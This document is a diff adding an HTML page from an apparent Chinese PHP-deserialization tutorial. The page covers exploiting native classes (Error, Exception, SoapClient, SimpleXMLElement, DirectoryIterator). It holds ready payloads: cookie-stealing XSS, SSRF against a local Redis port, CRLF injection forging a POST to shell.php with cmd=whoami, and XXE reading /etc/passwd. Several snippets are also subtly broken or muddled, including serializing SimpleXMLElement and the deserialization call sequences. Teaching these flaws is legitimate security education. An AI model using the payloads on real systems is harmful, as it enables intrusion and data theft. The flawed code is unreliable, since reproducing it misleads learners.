@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PHP原生类利用 - PHP反序列化学习</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <style>
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .animate-fade-in {
+      animation: fadeIn 0.5s ease-out forwards;
+    }
+    pre {
+      background: #1a1a2e;
+      border-radius: 8px;
+      padding: 16px;
+      overflow-x: auto;
+      font-size: 14px;
+    }
+    code {
+      font-family: 'Courier New', monospace;
+    }
+    .code-block {
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      padding: 16px;
+      overflow-x: auto;
+    }
+    .output-block {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      padding: 16px;
+      font-family: 'Courier New', monospace;
+    }
+  </style>
+</head>
+<body class="min-h-screen bg-gray-900 text-gray-200 font-mono">
+  
+  <!-- Header -->
+  <header class="border-b border-gray-700 bg-gray-950/50 backdrop-blur sticky top-0 z-50">
+    <div class="max-w-7xl mx-auto px-6 py-4">
+      <div class="flex items-center gap-4">
+        <a href="../index.html" class="text-blue-400 hover:text-blue-300 flex items-center gap-2">
+          <i data-lucide="arrow-left" class="w-5 h-5"></i>
+          <span>返回首页</span>
+        </a>
+        <div class="flex-1">
+          <h1 class="text-xl font-bold text-white">PHP 原生类利用</h1>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Content -->
+  <main class="max-w-7xl mx-auto px-6 py-8">
+    
+    <!-- 概述 -->
+    <section class="mb-12 animate-fade-in">
+      <div class="bg-cyan-900/20 border border-cyan-800 rounded-xl p-6 mb-8">
+        <h2 class="text-xl font-bold text-cyan-300 mb-3 flex items-center gap-2">
+          <i data-lucide="cpu" class="w-5 h-5"></i>
+          为什么要利用原生类？
+        </h2>
+        <p class="text-gray-300">
+          即使服务端<strong class="text-red-400">没有自定义</strong>可利用的类，也可以通过PHP内置的<strong class="text-yellow-400">原生类</strong>触发漏洞。
+          这些原生类实现了各种魔术方法，当满足特定条件时可以触发危险操作。
+        </p>
+      </div>
+    </section>
+
+    <!-- Error/Exception 类 -->
+    <section class="mb-12 animate-fade-in" style="animation-delay: 0.1s;">
+      <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+        <i data-lucide="alert-circle" class="w-6 h-6 text-red-400"></i>
+        Error/Exception 类 - XSS利用
+      </h2>
+
+      <div class="bg-gray-800 rounded-xl border border-gray-700 p-6 mb-6">
+        <div class="bg-red-900/20 border border-red-800 rounded-lg p-4 mb-6">
+          <h3 class="text-red-300 font-bold mb-2">触发条件</h3>
+          <p class="text-gray-300">
+            <code class="text-yellow-300">Error</code> 和 <code class="text-yellow-300">Exception</code> 类实现了 <code class="text-yellow-300">__toString()</code> 方法。
+            当它们被当作字符串输出时（如 <code class="text-yellow-300">echo $e</code>），会返回 <code class="text-yellow-300">$e->message</code>。
+          </p>
+          <p class="text-gray-400 text-sm mt-2">
+            如果message内容包含恶意JavaScript代码，可以触发XSS。
+          </p>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+          
+          <div>
+            <h4 class="text-white font-bold mb-3">PHP代码</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text gray-500"><?php</span>
+<span class="text comment">// 创建Error对象，设置message</span>
+$<span class="text variable">e</span> = <span class="text keyword">new</span> <span class="text class-name">Error</span>(<span class="text string">"<script>alert(1)</script>"</span>);
+
+<span class="text comment">// 当echo或字符串拼接时会触发__toString</span>
+<span class="text function">echo</span> <span class="text variable">$e</span>;
+<span class="text comment">// 输出: <script>alert(1)</script></span>
+
+<span class="text comment">// 字符串拼接也会触发</span>
+<span class="text variable">$str</span> = <span class="text string">"Error: "</span> . <span class="text variable">$e</span>;
+</code></pre>
+            </div>
+          </div>
+
+          <div>
+            <h4 class="text-white font-bold mb-3">反序列化利用</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text gray-500"><?php</span>
+<span class="text comment">// 如果存在反序列化入口：</span>
+<span class="text comment">// unserialize($_POST['data'])</span>
+
+<span class="text comment">// 构造XSS payload</span>
+$<span class="text variable">payload</span> = <span class="text function">serialize</span>(
+    <span class="text keyword">new</span> <span class="text class-name">Error</span>(<span class="text string">"<script>alert(document.cookie)</script>"</span>)
+);
+
+<span class="text comment">// POST提交后，如果输出点有echo</span>
+<span class="text comment">// 就会触发XSS</span>
+<span class="text function">echo</span> <span class="text variable">$_POST</span>[<span class="text string">'data'</span>];
+</code></pre>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+      <!-- Exception 类似 -->
+      <div class="bg-gray-800 rounded-xl border border-gray-700 p-6">
+        <h3 class="text-lg font-bold text-yellow-300 mb-4">Exception 类（类似）</h3>
+        <div class="code-block text-sm">
+<pre><code><span class="text gray-500"><?php</span>
+<span class="text comment">// Exception 同样有 __toString()</span>
+$<span class="text variable">e</span> = <span class="text keyword">new</span> <span class="text class-name">Exception</span>(<span class="text string">"<img src=x onerror=alert(1)>"</span>);
+<span class="text function">echo</span> <span class="text variable">$e</span>;
+<span class="text comment">// XSS payload 会被执行</span>
+</code></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- SoapClient 类 -->
+    <section class="mb-12 animate-fade-in" style="animation-delay: 0.2s;">
+      <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+        <i data-lucide="globe" class="w-6 h-6 text-blue-400"></i>
+        SoapClient 类 - SSRF + CRLF注入
+      </h2>
+
+      <div class="bg-gray-800 rounded-xl border border-gray-700 p-6 mb-6">
+        <div class="bg-blue-900/20 border border-blue-800 rounded-lg p-4 mb-6">
+          <h3 class="text-blue-300 font-bold mb-2">触发条件</h3>
+          <p class="text-gray-300">
+            <code class="text-yellow-300">SoapClient</code> 类实现了 <code class="text-yellow-300">__call()</code> 方法。
+            当调用不存在的方法时，会向 <code class="text-yellow-300">$location</code> 属性指定的URL发送HTTP请求。
+          </p>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+          
+          <div>
+            <h4 class="text-white font-bold mb-3">基本用法</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text gray-500"><?php</span>
+<span class="text comment">// 创建SoapClient，指向目标URL</span>
+$<span class="text variable">client</span> = <span class="text keyword">new</span> <span class="text class-name">SoapClient</span>(
+    <span class="text keyword">null</span>,
+    [<span class="text string">'location'</span> => <span class="text string">'http://target.com/api'</span>,
+     <span class="text string">'uri'</span>      => <span class="text string">'test'</span>,
+     <span class="text string">'user_agent'</span> => <span class="text string">'Mozilla'</span>]
+);
+
+<span class="text comment">// 调用不存在的方法触发__call</span>
+<span class="text comment">// 会向 location 发送HTTP请求</span>
+<span class="text variable">$client</span>-><span class="text function">notExistsMethod</span>();
+</code></pre>
+            </div>
+          </div>
+
+          <div>
+            <h4 class="text-white font-bold mb-3">SSRF利用</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text gray-500"><?php</span>
+<span class="text comment">// 反序列化入口时，可以指定location</span>
+$<span class="text variable">target</span> = <span class="text string">'http://127.0.0.1:6379/'</span>;  <span class="text comment">// Redis地址</span>
+
+$<span class="text variable">client</span> = <span class="text keyword">new</span> <span class="text class-name">SoapClient</span>(<span class="text keyword">null</span>, [
+    <span class="text string">'location'</span> => <span class="text variable">$target</span>,
+    <span class="text string">'uri'</span> => <span class="text string">'test'</span>
+]);
+
+<span class="text comment">// 序列化后POST提交</span>
+<span class="text function">unserialize</span>(<span class="text variable">$_POST</span>[<span class="text string">'data'</span>]);
+
+<span class="text comment">// 调用任意不存在的方法触发SSRF</span>
+<span class="text variable">$client</span>-><span class="text function">hack</span>();
+</code></pre>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+      <!-- CRLF注入 -->
+      <div class="bg-gray-800 rounded-xl border border-gray-700 p-6">
+        <h3 class="text-lg font-bold text-red-300 mb-4">CRLF 注入 - 添加任意Header</h3>
+        
+        <div class="bg-red-900/20 border border-red-800 rounded-lg p-4 mb-4">
+          <p class="text-gray-300">
+            通过在 <code class="text-yellow-300">user_agent</code> 中添加 <code class="text-yellow-300">\r\n</code>，可以在HTTP请求中添加任意Header，甚至构造POST请求！
+          </p>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+          
+          <div>
+            <h4 class="text-white font-bold mb-3">构造CRLF Payload</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text gray-500"><?php</span>
+<span class="text comment">// user_agent 中包含 \r\n 可以换行</span>
+$<span class="text variable">payload</span> = <span class="text string">"Mozilla/5.0\r\n"</span>
+    . <span class="text string">"Content-Type: application/json\r\n"</span>
+    . <span class="text string">"X-Custom: injected\r\n"</span>
+    . <span class="text string">"\r\n"</span>
+    . <span class="text string">'{"cmd":"whoami"}'</span>;
+
+$<span class="text variable">client</span> = <span class="text keyword">new</span> <span class="text class-name">SoapClient</span>(<span class="text keyword">null</span>, [
+    <span class="text string">'location'</span> => <span class="text string">'http://target.com/api'</span>,
+    <span class="text string">'uri'</span> => <span class="text string">'test'</span>,
+    <span class="text string">'user_agent'</span> => <span class="text variable">$payload</span>
+]);
+
+<span class="text comment">// 实际发送的请求会包含注入的Header和Body</span>
+<span class="text variable">$client</span>-><span class="text function">method</span>();
+</code></pre>
+            </div>
+          </div>
+
+          <div>
+            <h4 class="text-white font-bold mb-3">发送POST请求示例</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text gray-500"><?php</span>
+<span class="text comment">// 完整利用示例</span>
+$<span class="text variable">client</span> = <span class="text keyword">new</span> <span class="text class-name">SoapClient</span>(<span class="text keyword">null</span>, [
+    <span class="text string">'location'</span> => <span class="text string">'http://127.0.0.1:8888/cmd'</span>,
+    <span class="text string">'uri'</span> => <span class="text string">'test'</span>,
+    <span class="text string">'user_agent'</span> => <span class="text string">"test\r\n\r\nPOST /shell.php HTTP/1.1\r\n"</span>
+                    . <span class="text string">"Host: localhost\r\n"</span>
+                    . <span class="text string">"Content-Type: application/x-www-form-urlencoded\r\n"</span>
+                    . <span class="text string">"Content-Length: 30\r\n"</span>
+                    . <span class="text string">"\r\n"</span>
+                    . <span class="text string">"cmd=whoami"</span>
+]);
+
+<span class="text variable">$client</span>-><span class="text function">method</span>();
+</code></pre>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </section>
+
+    <!-- SimpleXMLElement 类 -->
+    <section class="mb-12 animate-fade-in" style="animation-delay: 0.3s;">
+      <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+        <i data-lucide="file-xml" class="w-6 h-6 text-green-400"></i>
+        SimpleXMLElement 类 - XXE
+      </h2>
+
+      <div class="bg-gray-800 rounded-xl border border-gray-700 p-6">
+        <div class="bg-green-900/20 border border-green-800 rounded-lg p-4 mb-6">
+          <h3 class="text-green-300 font-bold mb-2">触发条件</h3>
+          <p class="text-gray-300">
+            <code class="text-yellow-300">SimpleXMLElement</code> 类的构造函数可以解析XML。
+            如果允许加载外部实体，可以触发<strong class="text-red-400">XXE攻击</strong>。
+          </p>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+          
+          <div>
+            <h4 class="text-white font-bold mb-3">XXE利用</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text gray-500"><?php</span>
+<span class="text comment">// 构造XXE payload</span>
+$<span class="text variable">xxe</span> = <span class="text string">'<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>&xxe;</foo>'</span>;
+
+<span class="text variable">$xml</span> = <span class="text keyword">new</span> <span class="text class-name">SimpleXMLElement</span>(<span class="text variable">$xxe</span>);
+
+<span class="text comment">// 输出XML（可能触发外部实体）</span>
+<span class="text function">echo</span> <span class="text variable">$xml</span>->asXML();
+</code></pre>
+            </div>
+          </div>
+
+          <div>
+            <h4 class="text-white font-bold mb-3">反序列化利用</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text gray-500"><?php</span>
+<span class="text comment">// 如果存在反序列化入口</span>
+<span class="text variable">$payload</span> = <span class="text function">serialize</span>(
+    <span class="text keyword">new</span> <span class="text class-name">SimpleXMLElement</span>(<span class="text variable">$xxe</span>, LIBXML_NOENT)
+);
+
+<span class="text comment">// 提交后会解析XML，执行外部实体</span>
+<span class="text function">unserialize</span>(<span class="text variable">$_POST</span>[<span class="text string">'data'</span>]);
+</code></pre>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </section>
+
+    <!-- DirectoryIterator 类 -->
+    <section class="mb-12 animate-fade-in" style="animation-delay: 0.4s;">
+      <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+        <i data-lucide="folder-open" class="w-6 h-6 text-purple-400"></i>
+        DirectoryIterator 类 - 目录遍历
+      </h2>
+
+      <div class="bg-gray-800 rounded-xl border border-gray-700 p-6">
+        <p class="text-gray-400 mb-6">
+          <code class="text-yellow-300">DirectoryIterator</code> 类会遍历目录，当被当作字符串输出时会调用 <code class="text-yellow-300">__toString()</code>。
+        </p>
+
+        <div class="code-block">
+<pre><code><span class="text gray-500"><?php</span>
+<span class="text comment">// 遍历当前目录</span>
+<span class="text variable">$dir</span> = <span class="text keyword">new</span> <span class="text class-name">DirectoryIterator</span>(<span class="text string">"."</span>);
+<span class="text keyword">foreach</span> (<span class="text variable">$dir</span> as <span class="text variable">$file</span>) {
+    <span class="text function">echo</span> <span class="text variable">$file</span> . <span class="text string">"\n"</span>;
+}
+
+<span class="text comment">// __toString 在字符串拼接时触发</span>
+<span class="text variable">$dir</span> = <span class="text keyword">new</span> <span class="text class-name">DirectoryIterator</span>(<span class="text string">"/etc"</span>);
+<span class="text function">echo</span> <span class="text string">"Files: "</span> . <span class="text variable">$dir</span>;
+</code></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- 常用原生类速查 -->
+    <section class="mb-12 animate-fade-in" style="animation-delay: 0.5s;">
+      <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+        <i data-lucide="table" class="w-6 h-6 text-cyan-400"></i>
+        常用原生类速查表
+      </h2>
+
+      <div class="bg-gray-800 rounded-xl border border-gray-700 p-6 overflow-x-auto">
+        <table class="w-full text-sm">
+          <thead>
+            <tr class="border-b border-gray-700 text-gray-400">
+              <th class="text-left py-3 px-4">类名</th>
+              <th class="text-left py-3 px-4">触发魔术方法</th>
+              <th class="text-left py-3 px-4">可利用场景</th>
+            </tr>
+          </thead>
+          <tbody class="text-gray-300">
+            <tr class="border-b border-gray-700/50">
+              <td class="py-3 px-4 text-red-400">Error / Exception</td>
+              <td class="py-3 px-4">__toString()</td>
+              <td class="py-3 px-4">XSS（输出message内容）</td>
+            </tr>
+            <tr class="border-b border-gray-700/50">
+              <td class="py-3 px-4 text-blue-400">SoapClient</td>
+              <td class="py-3 px-4">__call()</td>
+              <td class="py-3 px-4">SSRF、CRLF注入（HTTP请求）</td>
+            </tr>
+            <tr class="border-b border-gray-700/50">
+              <td class="py-3 px-4 text-green-400">SimpleXMLElement</td>
+              <td class="py-3 px-4">构造方法</td>
+              <td class="py-3 px-4">XXE（XML外部实体）</td>
+            </tr>
+            <tr class="border-b border-gray-700/50">
+              <td class="py-3 px-4 text-purple-400">DirectoryIterator</td>
+              <td class="py-3 px-4">__toString()</td>
+              <td class="py-3 px-4">目录遍历、信息泄露</td>
+            </tr>
+            <tr class="border-b border-gray-700/50">
+              <td class="py-3 px-4 text-yellow-400">SplFileObject</td>
+              <td class="py-3 px-4">__call()</td>
+              <td class="py-3 px-4">任意文件读取</td>
+            </tr>
+            <tr class="border-b border-gray-700/50">
+              <td class="py-3 px-4 text-orange-400">ZipArchive</td>
+              <td class="py-3 px-4">构造方法</td>
+              <td class="py-3 px-4">文件写入（open后addFile）</td>
+            </tr>
+            <tr>
+              <td class="py-3 px-4 text-cyan-400">DOMDocument</td>
+              <td class="py-3 px-4">构造方法</td>
+              <td class="py-3 px-4">XEE、文件读取</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- Navigation -->
+    <div class="flex justify-between items-center mt-12 pt-8 border-t border-gray-800">
+      <a href="phar-unserialize.html" class="text-gray-400 hover:text-white flex items-center gap-2">
+        <i data-lucide="arrow-left" class="w-5 h-5"></i>
+        <span>上一节：Phar反序列化</span>
+      </a>
+      <a href="example1.html" class="text-blue-400 hover:text-blue-300 flex items-center gap-2">
+        <span>下一节：实战例题1</span>
+        <i data-lucide="arrow-right" class="w-5 h-5"></i>
+      </a>
+    </div>
+
+  </main>
+
+  <script>
+    lucide.createIcons();
+  </script>
+</body>
+</html>
